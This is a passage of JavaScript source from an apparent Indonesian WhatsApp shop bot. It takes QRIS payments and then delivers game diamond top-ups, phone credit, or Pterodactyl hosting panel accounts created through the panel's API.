  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "Skyzopedia" + `${Date.now()}`
await fetchJson(`https://h2h.okegisnaxdect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okegisnaxdect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "topupdiamond": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["topupdiamond"]) return Reply("❌ Produk *Top Up Diamond* saat ini tidak tersedia!");
if (!args[0] || !args[0].split("|")) return m.reply(example("id|serverid"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].split("|")[0]
let serverid = args[0].split("|")[1]
const { data } = await axios.get("https://www.okegisnaxdect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /TPG Diamond Mobile Legends/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /TPG Diamond Free Fire/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /TPG Game Mobile PUBG/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /TPG Stumble Guys/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.topupdiamond ${nodana}|${serverid} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Topup Diamond',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V3`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Diamond\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.id = args[0].split("|")[0]
Obj.serverid = args[0].split("|")[1]
Obj.nodana = Obj.id + Obj.serverid
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* ${Obj.nominal}
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "Skyzopedia" + `${Date.now()}`
await fetchJson(`https://h2h.okegisnaxdect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okegisnaxdect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "isipulsa": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["isipulsa"]) return Reply("❌ Produk *Top Up Pulsa* saat ini tidak tersedia!");
if (!args[0]) return m.reply(example("085XXX"))
if (!args[0].startsWith("08")) return m.reply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const { data } = await axios.get("https://www.okegisnaxdect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Axis Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana0 = data.filter(item => /Telkomsel Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Smartfren Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /Three Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /XL Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);   
 dana = [...dana, ...dana0, ...dana1, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `.isipulsa ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Isi Pulsa',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V3`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Nominal Isi Pulsa\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* ${Obj.nominal}
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "Skyzopedia" + `${Date.now()}`
await fetchJson(`https://h2h.okegisnaxdect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okegisnaxdect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "buypanel": {
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Produk Panel',
          sections: [
            {
              title: 'List Produk Qoupay',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'PANEL PRIVATE', 
                  description: "Spek R16 C4♨️",
                  id: `.buypanelpriv`
                },
                {
                  title: 'PANEL PUBLIC', 
                  description: "SPEK R24 C8♨️",
                  id: `.buypanelpub`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Panel Apa Yang Anda Ingin Pillih\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break
//===============Publix
case "buypanelpub": {
if (m.isGroup) return Reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["buypanelpub"]) return Reply("❌ Produk *PANEL* saat ini tidak tersedia!");
if (!text) return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited', 
                  description: "Rp11.000", 
                  id: '.buypanelpub unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: '.buypanelpub 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: '.buypanelpub 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: '.buypanelpub 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: '.buypanelpub 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: '.buypanelpub 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: '.buypanelpub 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: '.buypanelpub 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: '.buypanelpub 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: '.buypanelpub 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: '.buypanelpub 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "2000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "3000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "4000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "5000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "6000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "7000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "8000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "9000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "10000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return Reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Panel Pterodactyl
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await gisnaxd.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
//==========PanelPriv
case "buypanelpriv": {
if (m.isGroup) return Reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["buypanelpriv"]) return Reply("❌ Produk *PANEL* saat ini tidak tersedia!");
if (!text) return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Ram Panel',
          sections: [
            {
              title: 'List Ram Server Panel',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram Unlimited PROMO♨️', 
                  description: "Rp12.000", 
                  id: '.buypanelpriv unlimited'
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp2000", 
                  id: '.buypanelpriv 1gb'
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp4000", 
                  id: '.buypanelpriv 2gb'
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp6000", 
                  id: '.buypanelpriv 3gb'
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp8000", 
                  id: '.buypanelpriv 4gb'
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp10000", 
                  id: '.buypanelpriv 5gb'
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp12000", 
                  id: '.buypanelpriv 6gb'
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp14000", 
                  id: '.buypanelpriv 7gb'
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp16000", 
                  id: '.buypanelpriv 8gb'
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp18000", 
                  id: '.buypanelpriv 9gb'
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp20.000", 
                  id: '.buypanelpriv 10gb'
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "2000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "2000"
Obj.cpu = "60"
Obj.harga = "4000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "3000"
Obj.cpu = "80"
Obj.harga = "6000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "4000"
Obj.cpu = "100"
Obj.harga = "8000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "5000"
Obj.cpu = "120"
Obj.harga = "10000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "6000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "7000"
Obj.cpu = "160"
Obj.harga = "12000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "8000"
Obj.cpu = "180"
Obj.harga = "14000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "9000"
Obj.cpu = "200"
Obj.harga = "16000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "10000"
Obj.cpu = "220"
Obj.harga = "18000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "12000"
} else return Reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
